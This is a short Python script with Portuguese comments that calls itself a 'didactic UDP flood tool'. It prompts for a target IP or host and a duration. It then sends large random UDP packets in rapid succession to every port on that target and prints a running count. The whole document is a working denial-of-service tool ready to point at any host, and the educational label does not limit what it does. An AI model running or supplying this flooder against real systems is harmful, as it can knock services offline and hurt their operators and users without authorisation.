#!/usr/bin/env python3
"""Script simples para enviar muitos pacotes UDP a um IP."""

import random
import socket
import time

tamanho_pacote = 65000
pausa = 0.0001
tempo_padrao = 10


def main():
	print("Ferramenta didática de UDP flood")
	alvo = input("Informe o IP ou host do alvo: ").strip()
	if not alvo:
		print("Nenhum alvo informado. Saindo.")
		return

	tempo_bruto = input(
		"Por quantos segundos enviar (Enter usa 10 segundos): "
	).strip()
	if tempo_bruto:
		try:
			tempo_execucao = float(tempo_bruto)
		except ValueError:
			print("Valor inválido. Usando 10 segundos.")
			tempo_execucao = tempo_padrao
	else:
		tempo_execucao = tempo_padrao

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	dados = random._urandom(tamanho_pacote)
	enviados = 0
	inicio = time.time()

	try:
		while time.time() - inicio < tempo_execucao:
			for porta in range(1, 65536):
				if time.time() - inicio >= tempo_execucao:
					break
				sock.sendto(dados, (alvo, porta))
				enviados += 1
				print(f"Pacotes enviados: {enviados} para {alvo}:{porta}")
				time.sleep(pausa)
	except KeyboardInterrupt:
		print("\nParando envio a pedido do usuário.")

	print(f"Total enviado: {enviados} pacotes em {tempo_execucao} segundos.")


if __name__ == "__main__":
	main()
